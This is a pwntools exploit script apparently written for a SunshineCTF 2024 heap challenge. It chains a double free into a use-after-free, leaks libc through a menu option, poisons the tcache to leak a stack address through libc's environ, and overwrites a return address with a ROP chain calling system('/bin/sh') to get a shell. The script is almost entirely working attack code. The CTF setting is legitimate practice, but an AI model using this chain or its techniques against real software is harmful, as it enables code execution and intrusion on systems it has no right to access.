#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "2024.sunshinectf.games"
PORT = 24005

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, idx, value):
    sl(p,b"2")
    sla(p, b">>>", f"{idx}".encode())
    ru(p,b">>>")
    sl(p,value)
    ru(p, b">>>")

def edit(p, index, value):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    sl(p,value)
    

def delete(p, index):
    sl(p,b"3")
    sl(p,"%i" % index)
    ru(p, b">>>")

def use(p, index):
    sl(p,b"1")
    sl(p,"%i" % index)
    ru(p,b"<<<")
    ru(p, b": ")
    ret = rl(p)
    ru(p, b">>>")

    return ret[:-1]

def modified_use_remote(p, index):
    sl(p,b"1")
    sl(p,"%i" % index)
    ru(p,b"<<<")
    ru(p, b": ")
    #rl(p)
    ret = ru(p, b"<<<")
    ru(p, b">>>")
    
    return ret[-10:-3]
def modified_use(p, index):
    sl(p,b"1")
    sl(p,"%i" % index)
    ru(p,b"<<<")
    ru(p, b": ")
    rl(p)
    ret = rl(p)
    ru(p, b">>>")
    
    return ret

def leak(io):
    create(io, 5, b"Genie") 
    sl(p,b"1")
    sl(p,"%i" % 5)
    ru(p,b"<<<")
    ru(p, b": ")
    ret = rl(p)
    p.recvuntil(b'<<< The genie unrolls a shimmering map showing a secret starting point: ')
    libc = p.recvline().replace(b'\n', b'')
    ru(io, b">>>")
    return libc
    

def exploit(io,e,l):
    '''
        PLAN:
         - freeing twice allows for UAF
         - get heap leak through UAF
         - use genie for libc leak
         - get stack leak through environ
         - ret2libc!!
   
        BE MORE CAREFUL WITH DEALING WITH IO!!!! TRY TO BE AS PRECISE AS POSSIBLE!!!!

   '''
    delete(io, 1)
    delete(io, 1)
    #delete(io, 2)
    #delete(io, 2)

    mangle = use(io, 1)
    mangle = int.from_bytes(mangle, "little")
    print(f"========== Mangle bytes: {hex(mangle)}")

    #heap = use(io, 2)
    #heap = int.from_bytes(heap, "little") ^ mangle
    #heap -= 0x2a0
    #print(f"========== Heap leak: {hex(heap)}")

    libc = int(leak(io), 16) - l.sym["printf"]
    print(f"========== Libc leak: {hex(libc)}")

    # tcache poisoning to leak stack through libc environ
    delete(io, 4)
    delete(io, 3)
    delete(io, 6)
    delete(io, 6)

    target = (libc + l.sym["environ"] - 0x18) ^ mangle
    create(io, 6, p64(target))

    create(io, 4, b"AAAAA")
    create(io, 3, b"A"*0x13)
    
    modified_use(io, 3) # need this to work remotely
    stack = modified_use_remote(io, 3)
    #stack = modified_use(io, 3)
    print(f"========== {stack}")
    
    stack = int.from_bytes(stack[:-1], "little") - 0x140
    print(f"========== Stack leak: {hex(stack)}")
    
    # overwrite return pointer 
    delete(io, 2) 
    delete(io, 4) 
    delete(io, 5) 
    delete(io, 5) 
 
    target = (stack - 8) ^ mangle
    #target = (stack - 1 - 0x140) ^ mangle
    create(io, 5, p64(target))

    create(io, 2, b"A")

    #payload = p64(0x10f75b + libc) # pop rdi ; ret
    payload = b"A"*8 +  p64(0x10f75b + libc) # pop rdi ; ret
    payload += p64(next(l.search("/bin/sh")) + libc)
    payload += p64(0x2882f + libc)
    payload += p64(l.sym["system"] + libc)

    create(io, 4, payload)

    #use(io, 1)
    #use(io, 1)
    #use(io, 1)
    #use(io, 1)
    #use(io, 1)
    
    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
